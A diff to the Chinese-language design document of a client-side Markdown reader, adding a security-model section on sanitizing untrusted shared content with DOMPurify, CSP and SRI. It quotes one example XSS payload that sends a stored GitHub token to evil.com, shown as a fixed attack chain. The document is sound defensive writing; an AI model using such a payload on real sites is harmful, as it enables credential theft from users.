@@ -167,10 +167,13 @@ node scripts/check-lz-url.mjs
 | 路径 | 说明 |
 |------|------|
 | `src/utils/hash.ts` | hash 路径与参数解析 |
+| `src/utils/sanitize.ts` | HTML 净化（DOMPurify 封装），不可信正文的第一道防线 |
+| `src/utils/loadScript.ts` | CDN 脚本加载 + 钉死版本与 SRI 清单 |
 | `src/data/routes.ts` | 工具注册、页面标题、changelog |
 | `src/tools/markdown-reader/MarkdownReaderTool.tsx` | `c` / `gist` / `style` 实现与嵌入指南 UI |
 | `src/tools/calendar/CalendarTool.tsx` | `?d=` 轻量状态分享示例 |
 | `scripts/check-lz-url.mjs` | 即时链接编码往返自检 |
+| `scripts/check-csp.mjs` | CSP 内联脚本哈希与策略强度自检 |
 | `docs/roadmap.md` | 演进规划（非现状架构） |
 
 ---
@@ -180,3 +183,60 @@ node scripts/check-lz-url.mjs
 - **有状态、无后端**：能进 URL 的不建库；太大再借 Gist。
 - **钉死 CDN 版本**：分享链接是长期契约，解压库升级不能悄悄破坏旧链。
 - **阅读模式不写 localStorage 草稿**：避免打开他人分享覆盖本机编辑中的文档。
+- **不可信正文必须净化**：见下节。
+
+---
+
+## 7. 安全模型：不可信正文与凭证隔离
+
+`?c=` / `?gist=` 让阅读器的正文来源从「本人输入」扩展到「互联网任意来源」。
+这次扩展把渲染层从"个人编辑器"变成了"内容分发平台"，威胁模型必须相应升级。
+
+### 7.1 为什么必须净化
+
+`marked` v5+ **移除了内建 `sanitize` 选项**，Markdown 中的裸 HTML 会原样输出。
+若直接 `dangerouslySetInnerHTML`，则任何人构造的链接都能在本站源下执行脚本，
+进而读取同源 `sessionStorage` / `localStorage`——其中曾包含带 `gist` 权限的 GitHub Token。
+
+**攻击链**（已修复）：
+
+```
+<img src=x onerror="fetch('https://evil.com/?t='+localStorage.getItem('md-reader:gist-token'))">
+  → 压进 ?c=  → 受害者点开 → 零交互执行 → 凭证外发
+```
+
+注意 fragment 不经服务器，意味着此类 payload **不进访问日志、WAF 无法拦截、事后无法审计**。
+"状态进链接"的优势反面就是防御盲区，因此防线必须全部落在客户端。
+
+### 7.2 三层纵深防御
+
+| 层 | 手段 | 位置 |
+|----|------|------|
+| ① 切断执行 | DOMPurify 净化渲染结果 | `src/utils/sanitize.ts` |
+| ② 缩小赃物 | Token 移入 sessionStorage；阅读他人分享时**不读取** Token | `MarkdownReaderTool.tsx` |
+| ③ 兜底 | CSP 白名单 + SRI，阻断脚本执行与数据外发 | `index.html`、`src/utils/loadScript.ts` |
+
+**关键顺序**：净化必须放在「为标题注入 id」的 `replace` **之后**。
+该 `replace` 会把捕获到的原始属性串原样搬回输出，
+先净化再 replace 会让已被移除的危险属性重新混入。
+
+### 7.3 具体约定
+
+- **`FORBID_ATTR` 含 `style`**：除 CSS 注入外，任意 `style` 可用 `position:fixed`
+  铺满视口做点击劫持覆盖层。本站排版全靠 `.md-preview` 选择器，禁掉无副作用；
+  mermaid SVG 的表现属性（`fill` / `stroke` 等）走 `ADD_ATTR` 白名单，不受影响。
+- **`script-src` 不含 `'unsafe-inline'`**：这是让 `onerror=` 这类内联事件失效的关键。
+  页面自身那段防 FOUC 的内联脚本靠 sha256 哈希放行，
+  改动后必须同步更新哈希——`npm run check:csp` 会在 CI 中强制校验。
+- **mermaid 10.9.1 不依赖 `eval`**（已核实），故 CSP 无需放开 `'unsafe-eval'`。
+- **Kroki 返回的 SVG 不得 `innerHTML`**：现有实现包成 Blob 用 `<img>` 加载，
+  `<img>` 内的 SVG 不执行脚本，这是正确做法，请勿"优化"成内联。
+- **所有 CDN 钉死版本并附 SRI**：见 `src/utils/loadScript.ts` 的 `CDN` 常量。
+  升级时必须同步重算 integrity，否则脚本会被浏览器拒绝执行。
+
+### 7.4 自检
+
+```bash
+npm run check       # CSP 哈希校验 + lz-string 往返校验
+```
+
